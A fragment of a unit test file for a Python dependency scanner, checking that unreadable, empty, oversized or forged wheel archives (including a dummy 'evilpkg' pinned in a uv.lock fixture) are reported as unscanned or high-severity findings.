    expect(scanPythonPackage(new MapSource(new Map(), "pip-cache", { anomaly: "archive could not be read safely (x)" })).unscanned).toMatch(/could not be read safely/);
    expect(scanPythonPackage(new MapSource(new Map(), "pip-cache")).unscanned).toMatch(/no files/);
    const files = new Map([["a.py", Buffer.from("x = 1\n")], ["b.py", Buffer.from("y = 2\n")], ["zz/evil.py", Buffer.from(PAYLOAD)]]);
    expect(scanPythonPackage(new MapSource(files, "pip-cache", { maxFiles: 2 })).unscanned).toMatch(/more than 2 files/);
    expect(scanPythonPackage(new MapSource(files, "pip-cache")).unscanned).toBeNull();
    expect(scanPythonPackage(sourceFromArtifact(Buffer.from("not an archive"), "local")).unscanned).toMatch(/neither a wheel/);
  });

  it("scanDeps reports a pinned wheel that cannot be read as could-not-be-scanned (high)", async () => {
    const root = join(dir, "forged");
    const cache = join(root, "pip-cache");
    const whl = forgedWheel(300 * 1024 * 1024);
    const hex = createHash("sha256").update(whl).digest("hex");
    mkdirSync(join(cache, "http-v2", "a", "b"), { recursive: true });
    writeFileSync(join(cache, "http-v2", "a", "b", "w.body"), whl);
    writeFileSync(join(root, "uv.lock"), [
      "version = 1", 'requires-python = ">=3.12"', "",
      "[[package]]", 'name = "evilpkg"', 'version = "1.0.0"', 'source = { registry = "https://pypi.org/simple" }',
      "wheels = [", `    { url = "https://files.pythonhosted.org/packages/00/00/x/evilpkg-1.0.0-py3-none-any.whl", hash = "sha256:${hex}", size = ${whl.length} },`, "]", "",
      "[[package]]", 'name = "app"', 'version = "0.1.0"', 'source = { virtual = "." }', "dependencies = [", '    { name = "evilpkg" },', "]", "",
    ].join("\n"));
    const r = await scanDeps(root, { pipCacheDir: cache, uvCacheDir: emptyCache });
    expect(r.findings.find((f) => /could not be scanned/.test(f.title))).toMatchObject({ severity: "high", package: "evilpkg" });
    expect(r.deps.unscanned).toEqual([expect.objectContaining({ package: "evilpkg@1.0.0" })]);
    expect(r.deps.packages.find((p) => p.name === "evilpkg").capabilities).toBeNull();
    expect(r.deps.notInstalled).toEqual([]);
  });
});
